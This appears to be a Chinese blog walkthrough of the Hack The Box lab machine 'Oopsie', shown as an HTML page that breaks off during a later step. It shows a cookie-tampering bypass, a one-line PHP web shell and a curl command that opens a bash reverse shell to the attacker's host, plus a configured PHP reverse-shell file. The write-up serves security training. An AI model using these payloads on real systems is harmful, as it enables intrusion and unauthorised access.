@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Tier 2 第 2 台">
+<title>11. Oopsie</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/11.-oopsie/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="11. Oopsie">
+<meta property='og:description' content="Tier 2 第 2 台">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/11.-oopsie/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-05T14:14:23&#43;08:00'/><meta property='article:modified_time' content='2026-11-05T14:14:23&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/11.-oopsie/assets/image-20261104212916802.png' />
+<meta name="twitter:title" content="11. Oopsie">
+<meta name="twitter:description" content="Tier 2 第 2 台"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/11.-oopsie/assets/image-20261104212916802.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#task-8">Task 8</a></li>
+        <li><a href="#task-9">Task 9</a></li>
+        <li><a href="#task-10">Task 10</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/11.-oopsie/">
+                <img src="/p/11.-oopsie/assets/image-20261104212916802_hu11773010774080519141.png"
+                        srcset="/p/11.-oopsie/assets/image-20261104212916802_hu11773010774080519141.png 800w, /p/11.-oopsie/assets/image-20261104212916802_hu18402394139349871342.png 1600w"
+                        width="800" 
+                        height="334" 
+                        loading="lazy"
+                        alt="Featured image of post 11. Oopsie" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/11.-oopsie/">11. Oopsie</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Tier 2 第 2 台
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-05</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="oopsie">Oopsie
+</h1><p><img src="/p/11.-oopsie/assets/image-20261104212916802.png"
+	width="481"
+	height="201"
+	srcset="/p/11.-oopsie/assets/image-20261104212916802_hu4819266836031851937.png 480w, /p/11.-oopsie/assets/image-20261104212916802_hu1625945419264895973.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104212916802"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="574px"
+	
+></p>
+<p>About: Oopsie is a very easy Linux machine that highlights the impact of information disclosure and broken access control in web applications. Website enumeration reveals a guest login with manipulatable cookies and user IDs allowing escalation to an admin role and access to a file upload feature. A PHP reverse shell is then uploaded to gain an initial foothold. Further enumeration exposes hardcoded credentials enabling lateral movement to another user. Finally, privilege escalation is achieved by abusing a misconfigured SUID binary through PATH hijacking.</p>
+<p>介绍：Oopsie 是一个非常简单的 Linux 机器，它突出了 Web 应用程序中信息泄露和访问控制失效的影响。网站枚举显示，访客登录存在可操纵 cookie 和用户 ID 的漏洞，从而可以升级到管理员角色并访问文件上传功能。然后上传一个 PHP 反向 shell 来获得初始立足点。进一步枚举会暴露硬编码的凭据，从而允许横向移动到其他用户。最后，通过 PATH 劫持滥用配置错误的 SUID 二进制文件来实现权限提升。</p>
+<p>靶机 IP：10.129.95.191</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ping -c <span class="m">4</span> 10.129.95.191
+</span></span><span class="line"><span class="cl">PING 10.129.95.191 <span class="o">(</span>10.129.95.191<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.95.191: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">260</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.95.191: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">263</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.95.191: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">255</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.95.191: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">707</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.129.95.191 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets transmitted, <span class="m">4</span> received, 0% packet loss, <span class="nb">time</span> 3011ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 255.330/371.618/707.412/193.892 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="task-1">Task 1
+</h3><blockquote>
+<p>With what kind of tool can intercept web traffic?</p>
+<p>可以使用什么工具拦截网络流量？</p>
+</blockquote>
+<p>proxy 代理，俗称中间人，可以代替网络通信的一方收发网络请求。</p>
+<p><strong>答案：proxy</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>What is the path to the directory on the webserver that returns a login page?</p>
+<p>Web服务器上返回登录页面的目录路径是什么？</p>
+</blockquote>
+<p><img src="/p/11.-oopsie/assets/image-20261104213816609.png"
+	width="1223"
+	height="709"
+	srcset="/p/11.-oopsie/assets/image-20261104213816609_hu5093887726919325829.png 480w, /p/11.-oopsie/assets/image-20261104213816609_hu12925364033383471037.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104213816609"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p>在请求包中找到一个 <code>/cdn-cgi/login</code> 路径，访问发现是登录框。</p>
+<p><strong>答案：/cdn-cgi/login</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What can be modified in Firefox to get access to the upload page?</p>
+<p>如何在 Firefox 中进行修改才能访问上传页面？</p>
+</blockquote>
+<p><img src="/p/11.-oopsie/assets/image-20261104214028614.png"
+	width="724"
+	height="671"
+	srcset="/p/11.-oopsie/assets/image-20261104214028614_hu7550027654574377926.png 480w, /p/11.-oopsie/assets/image-20261104214028614_hu13824716236788994420.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104214028614"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="107"
+		data-flex-basis="258px"
+	
+></p>
+<p>不知道管理员账密，先通过 Guest 用户登录。</p>
+<p>访问 <code>/cdn-cgi/login/admin.php?content=uploads</code> 尝试进入文件上传页面。</p>
+<p>但实际上禁止访问，回显 <code>This action require super admin rights.</code>。</p>
+<p>也就是说我们的权限不够，那么服务器是怎么判断我们的权限的呢？查看请求头中的 Cookie 就能得到答案，我们的权限 <code>role=guest</code>。</p>
+<p><img src="/p/11.-oopsie/assets/image-20261104214153620.png"
+	width="1487"
+	height="609"
+	srcset="/p/11.-oopsie/assets/image-20261104214153620_hu3008083820617482077.png 480w, /p/11.-oopsie/assets/image-20261104214153620_hu649670309813232884.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104214153620"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>给 role 修改为 admin 试试。</p>
+<p><img src="/p/11.-oopsie/assets/image-20261104214351745.png"
+	width="1641"
+	height="422"
+	srcset="/p/11.-oopsie/assets/image-20261104214351745_hu9866903030315061732.png 480w, /p/11.-oopsie/assets/image-20261104214351745_hu13099624800358247453.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104214351745"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="388"
+		data-flex-basis="933px"
+	
+></p>
+<p>发现还是不行，那就说明还有对 <code>user=2233</code> 的校验，现在想办法拿到 Admin 的 user id。</p>
+<p>访问 <code>/cdn-cgi/login/admin.php?content=accounts&amp;id=2</code> 会回显 guest 用户的信息。</p>
+<p><img src="/p/11.-oopsie/assets/image-20261104214844792.png"
+	width="1410"
+	height="200"
+	srcset="/p/11.-oopsie/assets/image-20261104214844792_hu14939012897473717769.png 480w, /p/11.-oopsie/assets/image-20261104214844792_hu3228250704688053431.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104214844792"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="705"
+		data-flex-basis="1692px"
+	
+></p>
+<p>如果我们把 URL 修改为 <code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code>，就会回显 admin 的信息。</p>
+<p><img src="/p/11.-oopsie/assets/image-20261104214907550.png"
+	width="1412"
+	height="211"
+	srcset="/p/11.-oopsie/assets/image-20261104214907550_hu8004492326185528806.png 480w, /p/11.-oopsie/assets/image-20261104214907550_hu7421603093243214855.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104214907550"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="669"
+		data-flex-basis="1606px"
+	
+></p>
+<p>拿得到的 Access ID 修改 Cookie，就可以访问文件上传页面了。</p>
+<p><img src="/p/11.-oopsie/assets/image-20261104215006453.png"
+	width="1142"
+	height="733"
+	srcset="/p/11.-oopsie/assets/image-20261104215006453_hu13154653059097540934.png 480w, /p/11.-oopsie/assets/image-20261104215006453_hu5206189926693313495.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104215006453"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="373px"
+	
+></p>
+<p><strong>答案：cookie</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>What is the access ID of the admin user?</p>
+<p>管理员用户的访问ID是什么？</p>
+</blockquote>
+<p><strong>答案：34322</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>On uploading a file, what directory does that file appear in on the server?</p>
+<p>上传文件后，该文件出现在服务器上的哪个目录中？</p>
+</blockquote>
+<p>一般都是 <code>/uploads</code> 目录下。</p>
+<p>这里我上传了一个 <code>1.jpg</code> 文件，然后访问 <code>/uploads/1.jpg</code> 成功。</p>
+<p><strong>答案：uploads</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What is the file that contains the password that is shared with the robert user?</p>
+<p>与 robert 用户共享的包含密码的文件是什么？</p>
+</blockquote>
+<p>上传一个 <code>shell.php</code> 恶意脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# vim shell.php                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat shell.php
+</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/11.-oopsie/assets/image-20261104215809199.png"
+	width="1407"
+	height="182"
+	srcset="/p/11.-oopsie/assets/image-20261104215809199_hu2508314163289575118.png 480w, /p/11.-oopsie/assets/image-20261104215809199_hu2466666335119026449.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261104215809199"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="773"
+		data-flex-basis="1855px"
+	
+></p>
+<p>成功上传且能命令执行。</p>
+<p>反弹 shell 到攻击机。先监听端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后反弹 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl --get --data-urlencode <span class="s2">&#34;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.102/1234&#39; 0&gt;&amp;1&#34;</span> http://10.129.95.191/uploads/shell.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>收到 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.102<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.95.191<span class="o">]</span> <span class="m">48552</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1337<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@oopsie:/var/www/html/uploads$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这个 shell 有问题，就是输入命令没回显。</p>
+<p>kali 有现成的 reverse-shell 文件，我们 cp 过来然后改一下参数就行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+</span></span><span class="line"><span class="cl">                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# vim shell.php 
+</span></span><span class="line"><span class="cl">                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat shell.php   
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">set_time_limit <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.10.16.102&#39;</span><span class="p">;</span>  // CHANGE THIS
+</span></span><span class="line"><span class="cl"><span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>       // CHANGE THIS
+</span></span><span class="line"><span class="cl"><span class="nv">$chunk_size</span> <span class="o">=</span> 1400<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$write_a</span> <span class="o">=</span> null<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$error_a</span> <span class="o">=</span> null<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$daemon</span> <span class="o">=</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$debug</span> <span class="o">=</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后上传这个 shell，成功拿到可交互 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
